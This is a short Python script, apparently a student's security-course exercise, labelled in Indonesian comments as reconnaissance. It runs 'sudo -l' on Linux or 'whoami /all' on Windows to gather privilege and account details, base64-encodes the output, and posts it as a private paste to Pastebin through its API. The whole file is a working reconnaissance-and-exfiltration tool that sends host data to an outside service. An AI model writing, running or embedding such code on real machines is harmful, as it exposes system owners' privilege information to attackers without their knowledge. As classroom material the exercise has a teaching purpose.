#Nama: Albert William Sams
#NIM: 2301859915
#Kelas: LA07

import base64
import sys
from requests.api import post
from platform import system
from subprocess import PIPE, Popen

API_KEY = ''
API_URL = 'https://pastebin.com/api/api_post.php'

txt_message = 'Reconnaissance Result: \n'

#Jika OS dari user adalah menggunakan Linux
if system() == 'Linux':
    process = Popen('sudo -l', stdin=PIPE, stdout=PIPE, stderr=PIPE, shell=True)
    result, err = process.communicate()

#Jika OS dari user adalah menggunakan Windows
elif system() == 'Windows':
    process = Popen('whoami /all', stdin=PIPE, stdout=PIPE, stderr=PIPE, shell=True)
    result, err = process.communicate()

if result == b'':
    txt_message += err.decode()

else:
    txt_message += result.decode()

#Encode yang kita gunakan adalah base64
Paste_Text = base64.b64encode(txt_message.encode())
print(Paste_Text)

Data = {
    'api_dev_key': API_KEY,
    'api_option': 'paste',
    'api_paste_code': Paste_Text,
    'api_paste_name': 'GLS_PasteBin_2301859915',
    'api_paste_private': 1
}

resp = post(url = API_URL, data = Data)

if resp.status_code == 200:
    print(f'{resp.text}')
else:
    sys.exit()